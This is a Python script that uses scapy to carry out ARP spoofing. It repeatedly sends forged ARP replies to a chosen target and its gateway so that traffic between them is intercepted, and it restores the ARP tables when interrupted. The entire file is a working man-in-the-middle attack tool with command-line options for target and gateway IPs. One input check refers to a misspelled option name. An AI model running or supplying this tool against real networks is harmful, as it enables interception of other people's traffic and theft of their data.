import scapy.all as scapy
import time
import optparse


def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    #scapy.ls(scapy.ARP())
    brodcast_packet = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    #scapy.ls(scapy.Ether())
    combined_packet = brodcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1,verbose=False)[0]

    return answered_list[0][1].hwsrc


def arp_poisoning(target_ip,poisoned_ip):

    target_mac = get_mac_address(target_ip)

    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)
    scapy.send(arp_response,verbose=False)
    #scapy.ls(scapy.ARP())


def reset_operation(fooled_ip,gateway_ip):

    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)

    arp_response = scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip,hwsrc=gateway_mac)
    scapy.send(arp_response,verbose=False,count = 6)


def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option('-t','--target',dest='target_ip_address',help="Enter Target IP")
    parse_object.add_option('-g','--gateway',dest='gateway_ip_address',help="Enter Gateway IP")

    options = parse_object.parse_args()[0]

    if not options.target_ip_adress:
        print("Enter a Target IP Address")

    if not options.gateway_ip_address:
        print("Enter a Gateway IP Address")

    return options

number = 0

user_ips = get_user_input()
user_target_ip_address = user_ips.target_ip_address
user_gateway_ip_address = user_ips.gateway_ip_address


try:
    while True:
        arp_poisoning(user_target_ip_address,user_gateway_ip_address)
        arp_poisoning(user_gateway_ip_address,user_target_ip_address)

        number += 2

        print('\rSending packets... ' + str(number),end='')

        time.sleep(3)


except KeyboardInterrupt:
    print('\n Quit & Reset')
    reset_operation(user_target_ip_address,user_gateway_ip_address)
    reset_operation(user_gateway_ip_address,user_target_ip_address)
